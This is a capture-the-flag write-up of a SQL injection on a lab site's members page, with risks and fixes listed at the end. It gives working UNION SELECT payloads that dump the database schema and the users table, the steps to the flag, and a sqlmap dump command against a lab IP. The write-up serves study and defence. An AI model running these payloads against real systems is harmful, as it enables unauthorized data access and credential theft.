## Location :
Members Page

## Type of Vulnerability :
SQL INJECTION

## Explanation
The inputs are not protected, it is possible to inject SQL code and submit it, we can see this by simply testing 1 OR 1=1.
We will enter **1 or 1=1 UNION SELECT table_name, column_name FROM information_schema.columns** to obtain the structure of the database.
-> There are 5 tables: db_default, users, guestbook, list_images, vote_dbs.
We will start by looking at the 'users' table, there are two columns that seem interesting: 'commentaire', 'countersign'.
We will enter **1 or 1=1 UNION SELECT Commentaire, countersign FROM users** to get them.
We get:
-> First name: Decrypt this password -> then lower all the char. Sh256 on it and it's good!
-> Surname : 5ff9d0165b4f92b14994e5c685cdce28.
So we will decrypt the password then we will pass the result (FortyTwo) to lower case and do a sh256 on it.
-> We get the flag

---> Possible with SQLMAP: python3 sqlmap.py -u "http://192.168.41.90/?page=member&id=1&Submit=Submit#" --dump -T users

## Risks
- Unauthorized access to data
- Modification / deletion / addition of data
- Loss of total control of the database
- Opening to certain types of DoS (Denial of Service) attacks
- Identity theft
- Unauthorized access to restricted functions

## How to Fix
- Use of prepared and / or parameterized queries. Allows data to be distinguished from commands.
- Escaping user inputs
- Validation of user inputs
- Use of a database firewall (monitors queries and blocks suspicious ones)
- Limiting privileges to the strict minimum required
